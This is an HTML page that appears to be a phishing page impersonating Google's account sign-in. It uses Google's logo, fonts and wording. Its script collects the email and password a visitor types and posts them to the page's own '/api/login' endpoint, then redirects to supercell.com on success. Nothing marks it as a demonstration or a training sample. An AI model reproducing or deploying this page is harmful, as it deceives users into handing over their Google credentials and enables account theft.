<!DOCTYPE html>
<html>
<head>
  <title>Sign in - Google Accounts</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="style.css">
</head>
<body class="login-body">
<div class="login-container">
  <img src="https://ssl.gstatic.com/accounts/ui/logo_2x.png" alt="Google Logo" class="google-logo">
  <h2>Sign in</h2>
  <p class="login-sub">Use your Google Account</p>
  <input id="loginEmail" type="email" placeholder="Email or phone">
  <p class="link">Forgot email?</p>
  <input id="loginPassword" type="password" placeholder="Password">
  <p class="link">Learn more</p>
  <div class="login-actions">
    <a href="#" class="create-account">Create account</a>
    <button onclick="login()">Next</button>
  </div>
</div>
<script>
async function login(){
  const email=document.getElementById("loginEmail").value;
  const password=document.getElementById("loginPassword").value;
  const res=await fetch("/api/login",{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({email,password})});
  const data=await res.json();
  if(data.success) window.location.href="https://supercell.com";
}
</script>
</body>
</html>
